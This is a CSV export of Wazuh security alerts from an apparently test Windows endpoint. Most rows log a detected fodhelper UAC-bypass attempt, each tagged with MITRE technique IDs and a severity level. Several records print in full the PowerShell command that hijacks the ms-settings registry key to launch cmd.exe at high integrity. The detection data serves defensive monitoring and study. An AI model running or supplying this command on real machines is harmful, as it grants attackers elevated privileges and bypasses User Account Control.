2025-12-29T10:38:02.068Z,Endpoint3-Win,1,61104,Service startup type was changed,3,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'param3': 'auto start', 'param4': 'BITS', 'param1': 'Background Intelligent Transfer Service', 'param2': 'demand start'}, 'system': {'eventID': '7040', 'eventSourceName': 'Service Control Manager', 'keywords': '0x8080000000000000', 'providerGuid': '{555908d1-a6d7-4695-8e1e-26931d2012f4}', 'level': '4', 'channel': 'System', 'opcode': '0', 'message': '""The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.""', 'version': '0', 'systemTime': '2025-12-29T10:36:48.8681415Z', 'eventRecordID': '2399', 'threadID': '2412', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '0', 'processID': '812', 'severityValue': 'INFORMATION', 'providerName': 'Service Control Manager'}}}, 'rule': {'firedtimes': 3, 'mail': False, 'level': 3, 'pci_dss': ['10.6'], 'hipaa': ['164.312.b'], 'tsc': ['CC6.1', 'CC6.8', 'CC7.2', 'CC7.3'], 'description': 'Service startup type was changed', 'groups': ['windows', 'windows_system', 'policy_changed'], 'id': '61104', 'nist_800_53': ['AU.6'], 'info': 'This does not appear to be logged on Windows 2000', 'gdpr': ['IV_35.7.d']}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.068Z', 'location': 'EventChannel', 'id': '1767004682.7509160', 'timestamp': '2025-12-29T11:38:02.068+0100'}",low,
2025-12-29T10:38:02.070Z,Endpoint3-Win,1,61109,Name resolution for the name wpad timed out,5,,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'addressLength': '128', 'clientPID': '2524', 'address': '02000000C0A86402000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'queryName': 'wpad'}, 'system': {'eventID': '1014', 'keywords': '0x4000000010000000', 'providerGuid': '{1c95126e-7eea-49a9-a3fe-a378b03ddb4d}', 'level': '3', 'channel': 'System', 'opcode': '0', 'message': '""Name resolution for the name wpad timed out after none of the configured DNS servers responded. Client PID 2524.""', 'version': '1', 'systemTime': '2025-12-29T10:37:55.2307057Z', 'eventRecordID': '2400', 'threadID': '824', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1014', 'processID': '2060', 'severityValue': 'WARNING', 'providerName': 'Microsoft-Windows-DNS-Client'}}}, 'rule': {'firedtimes': 3, 'mail': False, 'level': 5, 'description': 'Name resolution for the name wpad timed out', 'groups': ['windows', 'windows_system'], 'id': '61109'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.070Z', 'location': 'EventChannel', 'id': '1767004682.7511054', 'timestamp': '2025-12-29T11:38:02.070+0100'}",medium,
2025-12-29T10:38:02.340Z,Endpoint3-Win,1,92004,Powershell process spawned Windows command shell instance,4,T1059.003,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'PowerShell.EXE', 'image': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-ab3e-6951-cb0d-000000001000}', 'description': 'Windows PowerShell', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-58c2-6952-b018-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5948', 'processId': '8752', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:32:34.680', 'hashes': 'SHA1=EB42621654E02FAF2DE940442B6DEB1A77864E5B,MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1059.001,technique_name=PowerShell', 'company': 'Microsoft Corporation', 'commandLine': '\\""powershell.exe\\"" &amp; {New-Item \\\\\\""\\""HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\""\\"" -Force New-ItemProperty \\\\\\""\\""HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\""\\"" -Name \\\\\\""\\""DelegateExecute\\\\\\""\\"" -Value \\\\\\""\\""\\\\\\""\\"" -Force Set-ItemProperty \\\\\\""\\""HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\""\\"" -Name \\\\\\""\\""(default)\\\\\\""\\"" -Value \\\\\\""\\""C:\\\\Windows\\\\System32\\\\cmd.exe\\\\\\""\\"" -Force Start-Process \\\\\\""\\""C:\\\\Windows\\\\System32\\\\fodhelper.exe\\\\\\""\\""}', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.5074 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-12-29 10:32:34.680\r\nProcessGuid: {411eefe4-58c2-6952-b018-000000001000}\r\nProcessId: 8752\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.5074 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: ""powershell.exe"" & {New-Item \\""""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"""" -Force\nNew-ItemProperty \\""""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"""" -Name \\""""DelegateExecute\\"""" -Value \\""""\\"""" -Force\nSet-ItemProperty \\""""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"""" -Name \\""""(default)\\"""" -Value \\""""C:\\Windows\\System32\\cmd.exe\\"""" -Force\nStart-Process \\""""C:\\Windows\\System32\\fodhelper.exe\\""""}\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=EB42621654E02FAF2DE940442B6DEB1A77864E5B,MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {411eefe4-ab3e-6951-cb0d-000000001000}\r\nParentProcessId: 5948\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:32:34.7178618Z', 'eventRecordID': '18765', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 5, 'mail': False, 'level': 4, 'description': 'Powershell process spawned Windows command shell instance', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Windows Command Shell'], 'id': ['T1059.003'], 'tactic': ['Execution']}, 'id': '92004'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.340Z', 'location': 'EventChannel', 'id': '1767004682.7513183', 'timestamp': '2025-12-29T11:38:02.340+0100'}",medium,"\""powershell.exe\"" &amp; {New-Item \\\""\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\""\"" -Force New-ItemProperty \\\""\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\""\"" -Name \\\""\""DelegateExecute\\\""\"" -Value \\\""\""\\\""\"" -Force Set-ItemProperty \\\""\""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\\""\"" -Name \\\""\""(default)\\\""\"" -Value \\\""\""C:\\Windows\\System32\\cmd.exe\\\""\"" -Force Start-Process \\\""\""C:\\Windows\\System32\\fodhelper.exe\\\""\""}"
2025-12-29T10:38:02.409Z,Endpoint3-Win,1,92213,Executable file dropped in folder commonly used by malware,15,T1105,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-58c2-6952-b018-000000001000}', 'processId': '8752', 'utcTime': '2025-12-29 10:32:35.118', 'targetFilename': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_0z4b4x5a.hkr.ps1', 'ruleName': 'technique_id=T1059.001,technique_name=PowerShell', 'creationUtcTime': '2025-12-29 10:32:35.118', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '11', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-12-29 10:32:35.118\r\nProcessGuid: {411eefe4-58c2-6952-b018-000000001000}\r\nProcessId: 8752\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\ayoub\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0z4b4x5a.hkr.ps1\r\nCreationUtcTime: 2025-12-29 10:32:35.118\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:32:35.1480535Z', 'eventRecordID': '18775', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '11', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 7, 'mail': True, 'level': 15, 'description': 'Executable file dropped in folder commonly used by malware', 'groups': ['sysmon', 'sysmon_eid11_detections', 'windows'], 'mitre': {'technique': ['Ingress Tool Transfer'], 'id': ['T1105'], 'tactic': ['Command and Control']}, 'id': '92213'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.409Z', 'location': 'EventChannel', 'id': '1767004682.7521532', 'timestamp': '2025-12-29T11:38:02.409+0100'}",critical,
2025-12-29T10:38:02.489Z,Endpoint3-Win,1,92306,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe added to the registry a subkey associated with UAC bypass by auto-elevated processes,12,T1548.002;T1112,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'targetObject': 'HKU\\\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute', 'processGuid': '{411eefe4-58c2-6952-b018-000000001000}', 'processId': '8752', 'utcTime': '2025-12-29 10:32:38.464', 'details': '(Empty)', 'eventType': 'SetValue', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '13', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-12-29 10:32:38.464\r\nProcessGuid: {411eefe4-58c2-6952-b018-000000001000}\r\nProcessId: 8752\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\ms-settings\\shell\\open\\command\\DelegateExecute\r\nDetails: (Empty)\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:32:38.4660162Z', 'eventRecordID': '18786', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '13', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 12, 'description': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe added to the registry a subkey associated with UAC bypass by auto-elevated processes', 'groups': ['sysmon', 'sysmon_eid13_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control', 'Modify Registry'], 'id': ['T1548.002', 'T1112'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92306'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.489Z', 'location': 'EventChannel', 'id': '1767004682.7524611', 'timestamp': '2025-12-29T11:38:02.489+0100'}",critical,
2025-12-29T10:38:02.496Z,Endpoint3-Win,1,92305,Command interpreter added to registry key associated to UAC bypass by auto-elevated processes,12,T1548.002;T1112,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'targetObject': 'HKU\\\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\(Default)', 'processGuid': '{411eefe4-58c2-6952-b018-000000001000}', 'processId': '8752', 'utcTime': '2025-12-29 10:32:38.543', 'details': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'eventType': 'SetValue', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '13', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2025-12-29 10:32:38.543\r\nProcessGuid: {411eefe4-58c2-6952-b018-000000001000}\r\nProcessId: 8752\r\nImage: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetObject: HKU\\S-1-5-21-1194248728-2016982980-2923753283-1001_Classes\\ms-settings\\shell\\open\\command\\(Default)\r\nDetails: C:\\Windows\\System32\\cmd.exe\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:32:38.5450109Z', 'eventRecordID': '18787', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '13', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 2, 'mail': True, 'level': 12, 'description': 'Command interpreter added to registry key associated to UAC bypass by auto-elevated processes', 'groups': ['sysmon', 'sysmon_eid13_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control', 'Modify Registry'], 'id': ['T1548.002', 'T1112'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92305'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.496Z', 'location': 'EventChannel', 'id': '1767004682.7527695', 'timestamp': '2025-12-29T11:38:02.496+0100'}",critical,
2025-12-29T10:38:02.502Z,Endpoint3-Win,1,92056,"Powershell process invoked known auto-elevated utility FodHelper.EXE, may have been used to bypass UAC",14,T1548.002,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'FodHelper.EXE', 'image': 'C:\\\\Windows\\\\System32\\\\fodhelper.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-58c2-6952-b018-000000001000}', 'description': 'Features On Demand Helper', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': '\\""powershell.exe\\"" &amp; {New-Item \\\\\\""\\""HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\""\\"" -Force New-ItemProperty \\\\\\""\\""HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\""\\"" -Name \\\\\\""\\""DelegateExecute\\\\\\""\\"" -Value \\\\\\""\\""\\\\\\""\\"" -Force Set-ItemProperty \\\\\\""\\""HKCU:\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\\""\\"" -Name \\\\\\""\\""(default)\\\\\\""\\"" -Value \\\\\\""\\""C:\\\\Windows\\\\System32\\\\cmd.exe\\\\\\""\\"" -Force Start-Process \\\\\\""\\""C:\\\\Windows\\\\System32\\\\fodhelper.exe\\\\\\""\\""}', 'processGuid': '{411eefe4-58c6-6952-b418-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '8752', 'processId': '12268', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:32:38.824', 'hashes': 'SHA1=7CAC80110A5F89AFA0E5B8A814ADFEA766735389,MD5=1D5D85D9F34ED7536F791E557C627DCD,SHA256=EC9B0D09B56F46F0308D594CD9D595EB492A67ED0024A9B7A13FA995966932F7,IMPHASH=DBF7EE2D74DF21B22A4262589616FD47', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1548.002,technique_name=Bypass User Access Control', 'company': 'Microsoft Corporation', 'commandLine': '\\""C:\\\\Windows\\\\System32\\\\fodhelper.exe\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.1150 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1548.002,technique_name=Bypass User Access Control\r\nUtcTime: 2025-12-29 10:32:38.824\r\nProcessGuid: {411eefe4-58c6-6952-b418-000000001000}\r\nProcessId: 12268\r\nImage: C:\\Windows\\System32\\fodhelper.exe\r\nFileVersion: 10.0.26100.1150 (WinBuild.160101.0800)\r\nDescription: Features On Demand Helper\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FodHelper.EXE\r\nCommandLine: ""C:\\Windows\\System32\\fodhelper.exe"" \r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=7CAC80110A5F89AFA0E5B8A814ADFEA766735389,MD5=1D5D85D9F34ED7536F791E557C627DCD,SHA256=EC9B0D09B56F46F0308D594CD9D595EB492A67ED0024A9B7A13FA995966932F7,IMPHASH=DBF7EE2D74DF21B22A4262589616FD47\r\nParentProcessGuid: {411eefe4-58c2-6952-b018-000000001000}\r\nParentProcessId: 8752\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: ""powershell.exe"" & {New-Item \\""""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"""" -Force\nNew-ItemProperty \\""""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"""" -Name \\""""DelegateExecute\\"""" -Value \\""""\\"""" -Force\nSet-ItemProperty \\""""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\\"""" -Name \\""""(default)\\"""" -Value \\""""C:\\Windows\\System32\\cmd.exe\\"""" -Force\nStart-Process \\""""C:\\Windows\\System32\\fodhelper.exe\\""""}\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:32:38.8323578Z', 'eventRecordID': '18788', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': True, 'level': 14, 'description': 'Powershell process invoked known auto-elevated utility FodHelper.EXE, may have been used to bypass UAC', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Bypass User Account Control'], 'id': ['T1548.002'], 'tactic': ['Privilege Escalation', 'Defense Evasion']}, 'id': '92056'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:38:02.502Z', 'location': 'EventChannel', 'id': '1767004682.7530796', 'timestamp': '2025-12-29T11:38:02.502+0100'}",critical,"\""C:\\Windows\\System32\\fodhelper.exe\"""
